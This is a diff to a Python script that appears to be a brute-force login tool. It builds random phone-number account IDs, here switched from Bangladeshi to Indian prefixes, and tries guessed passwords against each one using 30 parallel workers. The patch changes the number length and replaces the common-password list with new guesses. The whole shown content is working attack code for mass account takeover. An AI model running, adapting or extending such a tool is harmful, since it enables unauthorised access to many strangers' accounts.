@@ -592,14 +592,14 @@ def bd():
                 pcp=[]
                 clear()
                 pcp.append(f'y')
-                print('\033[1;32m Code example: 016,017,018,019')
+                print('\033[1;32m Code example: +91637,+91830')
                 code = input('\033[1;37m put code: ')
                 try:
                         limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                 except ValueError:
                         limit = 5000
                 for nmbr in range(limit):
-                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
                 with tred(max_workers=30) as sat:     
                         clear()
@@ -611,7 +611,7 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'bangladesh','i love you','@#@#@#','12389']
+                                passlist = [psx,ids,'5723200','59039200,']
                                 sat.submit(apix,ids,passlist)
                 print('\033[1;37m')
                 linex()
